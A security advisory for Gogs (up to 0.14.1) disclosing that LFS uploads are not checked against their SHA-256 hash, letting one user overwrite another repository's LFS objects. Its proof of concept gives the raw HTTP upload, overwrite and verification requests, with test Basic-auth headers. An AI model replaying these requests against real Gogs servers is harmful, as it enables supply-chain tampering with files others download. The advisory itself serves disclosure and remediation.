# Gogs: Cross-repository LFS object overwrite via missing content hash verification

**GHSA**: GHSA-cj4v-437j-jq4c | **CVE**: CVE-2026-25921 | **Severity**: critical (CVSS 9.3)

**CWE**: CWE-345

**Affected Packages**:
- **gogs.io/gogs** (go): <= 0.14.1

## Description

### Summary
Overwritable LFS object across different repos leads to supply-chain attack, all LFS objects are vulnerable to be maliciously overwritten by malicious attackers.

### Details
Gogs store all LFS objects in the same place, no isolation between different repositories. (repo id not concatenated to storage path) https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/lfsutil/storage.go#L52-L58

Gogs does not verify uploaded LFS file content against its claimed SHA-256, meaning attackers can manipulate the uploaded file like injecting backdoor. https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/lfsutil/storage.go#L79-L89

Here's the comment that trust client to retry upload allowing them to overwrite. However, this assumption does not hold in the case of a malicious client.  https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/route/lfs/basic.go#L111-L113

### PoC

```
# ./gogs -v
Gogs version 0.13.0
```

#### 1. User (admin1) upload a LFS object into their repository `admin1/testlfs.git` normally

```
POST http://172.29.121.170/admin1/testlfs.git/info/lfs/objects/batch
User-Agent: git-lfs/3.0.2 (GitHub; linux amd64; go 1.17.2)
Accept-Encoding: gzip, deflate, br
Accept: application/vnd.git-lfs+json
Connection: keep-alive
Content-Type: application/vnd.git-lfs+json
Authorization: Basic YWRtaW4xOjg2ZjgxMmNkNDBiODY1YmIzZGQ1NTgyNDI2OTE2M2FmNDM3ZGZjZWI=
Content-Length: 168

{"operation": "upload", "objects": [{"oid": "5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a", "size": 1048576}], "ref": {"name": "refs/heads/master"}}

response: <Response [200]>
Connection: close
Content-Length: 438
Content-Type: application/vnd.git-lfs+json
Date: Thu, 28 Nov 2024 13:57:47 GMT
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647

{'objects': [{'actions': {'upload': {'header': {'Content-Type': 'application/octet-stream'},
                                     'href': 'http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a'},
                          'verify': {'href': 'http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/verify'}},
              'oid': '5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a',
              'size': 1048576}],
 'transfer': 'basic'}

[STEP3] file_upload PUT http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a
headers: {'Content-Type': 'application/octet-stream', 'Accept': 'application/vnd.git-lfs+json', 'Authorization': 'Basic YWRtaW4xOjg2ZjgxMmNkNDBiODY1YmIzZGQ1NTgyNDI2OTE2M2FmNDM3ZGZjZWI='}
response:  <Response [200]>
[verify POST] http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/verify
POST http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/verify
User-Agent: git-lfs/3.0.2 (GitHub; linux amd64; go 1.17.2)
Accept-Encoding: gzip, deflate, br
Accept: application/vnd.git-lfs+json
Connection: keep-alive
Content-Type: application/vnd.git-lfs+json
Authorization: Basic YWRtaW4xOjg2ZjgxMmNkNDBiODY1YmIzZGQ1NTgyNDI2OTE2M2FmNDM3ZGZjZWI=
Cookie: lang=en-US
Content-Length: 92

{"oid": "5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a", "size": 1048576}

response: <Response [200]>
Connection: close
Content-Length: 0
Date: Thu, 28 Nov 2024 13:57:47 GMT
```

In this step, upload a LFS object `5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a`

#### 2. Attacker `user2` overwrite this file by uploading manipulated content to their repo `user2/public.git`

```
PUT http://172.29.121.170:3000/user2/public.git/info/lfs/objects/basic/5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a
Content-Type: application/octet-stream
Accept: application/vnd.git-lfs+json
Authorization: Basic dXNlcjI6NTRmZGU5ZmI3YjdmOTQ0MmM3MzY4ODhlMWIyNjZmMWE4MzAyMzE5NQ==

response:  <Response [200]>
```

#### 3. Verify the content has been overwritten:

```
# curl http://172.29.121.170:3000/admin1/testlfs.git/info/lfs/objects/basic/5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a -H "Authorization: Basic YWRtaW4xOjg2ZjgxMmNkNDBiODY1YmIzZGQ1NTgyNDI2OTE2M2FmNDM3ZGZjZWI=" -i
HTTP/1.1 200 OK
Content-Length: 1048576
Connection: keep-alive
Content-Type: application/octet-stream
Date: Thu, 28 Nov 2024 14:01:53 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647

curl: (18) transfer closed with 1048563 bytes remaining to read
2222 replaced
```

### Impact
All LFS objects hosted on Gogs can be maliciously overwritten. Supply-chain attack is possible, and when user download LFS object from webpage, there's no warning at all. 

### Fix Suggestion

Uploaded LFS objects must be verified to ensure their content matches the claimed SHA-256 hash, to prevent the upload of tampered files.

Fix example: https://code.rhodecode.com/rhodecode-vcsserver/changeset/a680a60521bf02c29413d718ebca36c4f692ea4a?diffmode=unified
